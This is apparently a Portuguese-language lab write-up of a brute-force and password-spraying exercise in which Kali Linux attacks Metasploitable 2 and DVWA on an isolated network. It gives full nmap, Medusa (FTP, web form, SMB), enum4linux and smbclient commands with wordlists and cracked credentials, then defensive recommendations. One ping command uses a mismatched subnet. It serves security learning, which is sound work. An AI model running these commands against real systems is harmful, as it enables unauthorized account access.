*Simulação de Ataque Brute Force com Kali Linux, Medusa e Metasploitable 2*

Este projeto documenta uma simulação prática de ataques de força bruta e password spraying utilizando Kali Linux, Medusa, Metasploitable 2 e DVWA.
O objetivo é entender, na prática, como ocorrem ataques comuns em ambientes vulneráveis, reforçando a importância de boas práticas de segurança.

*Ambiente de Teste*

As duas máquinas foram configuradas em rede Host-Only no VirtualBox.

Kali Linux	IP: 192.168.56.101
Metasploitable 2	IP: 192.168.56.102

Para confirmar o endereço foi utilizado o comando: ip a

Antes de qualquer teste, foi feito um ping para garantir que as VMs estavam se comunicando corretamente

Comando: ping -c 4 192.168.58.102

*1° Etapa: Enumeração de Portas (Nmap)*

Ferramenta utilizada: Nmap 7.95
Objetivo: identificar porta FTP aberta

Comando: nmap -sV -p 21,22,80,139,445 192.168.56.102

Portas abertas encontradas:
21 - serviço: FTP - versão: vsftpd 2.3.4
22 - serviço: SSH - versão: OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80 - serviço: HTTP - versão: Apach httpd 2.2.8
139 - serviço: netbios-ssn - versão: Samba smbd 3.X - 4.X
445 - serviço: netbios-ssn - versão: Samba smbd 3.X - 4.X

Identificado que a porta FTP esta aberta usa-se o comando: "ftp (IP da VM Metasploitable)" para confirmar que o serviço esta ativo

-------------------------------------------------------------------------------------

*1° Ataque: Ataque Brute Force FTP (Medusa)*

Ferramenta utilizada: Medusa v2.3

Criação de wordlists:

Para usernames: arquivo usernames.txt 
contendo as seguintes palavras: msfadmin, user, service, root, admin, test, guest, info, adm, administrator, ftp, admin123, 123admin e qwerty
Comando: echo -e 'msfadmin\nuser\nservice\nroot\nadmin\ntest\nguest\ninfo\nadm\nadministrator\nftp\nadmin123\n123admin\nqwerty' > usernames.txt

Para senhas: arquivo pass.txt com as seguintes palavras: 123456, password, qwerty, msfadmin, admin, Welcome123, admin123, root, 123admin, pass123
Comando: echo -e '123456\npassword\nqwerty\nmsfadmin\nadmin\nWelcome123\nadmin123\nroot\n123admin\npass123' > pass.txt

Comando Brute Force: medusa -h 192.168.56.102 -U usernames.txt -P pass.txt -M ftp -t 10

Resultado:
usuario: msfadmin | senha: msfadmin



*2° Ataque: Brute Force em Aplicação Web (DVWA)*

O alvo utilizado foi o DVWA rodando no próprio Metasploitable 2.
Ferramenta utilizada: Medusa v2.3

Comando Brute Force: 
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username="USER"&password="PASS"&Login=Login' \
  -m 'FAIL=Login failed' -t 6

Resultado:
usuario: msfadmin | senha: msfadmin



*3° Ataque: Enumeração SMB (enum4linux)*

Ferramenta utilizada: enum4linux v0.9.1

Comando: enum4linux -a 192.168.56.102 | tee enum4_output.txt



*4° Ataque: Password Spraying (Medusa)*

Ferramenta utilizada: Medusa v2.3

Comando: medusa -h 192.168.56.102 -U usernames.txt -P pass.txt -M smbnt -t 2 -T 50

Resultado:
usuario: msfadmin | senha: msfadmin



Verificando acesso ao smb:

Comando: smbclient -L //192.168.56.102 -U msfadmin
A autenticação foi bem-sucedida, exibindo os compartilhamentos disponíveis.


*Principais Vulnerabilidades Encontradas*


Uso de senhas extremamente fracas
Usuário e senha sendo idênticos (ex.: msfadmin/msfadmin)
Ausência de controle de tentativas
Serviços expostos sem qualquer restrição interna

*Soluções:*

Habilitar MFA/2FA sempre que possível
Bloqueio temporário do IP após múltiplas tentativas
Monitoramento ativo de logs e eventos
Segmentar serviços internos

*Recomendações para criação de senhas:*

mínimo de 12 caracteres, utlizar letras maiúsculas (A-Z) e minúsculas (a-z), utlizar símbolos (!, @, #, $, %, &, *), evitar informações pessoais e organizacionais.
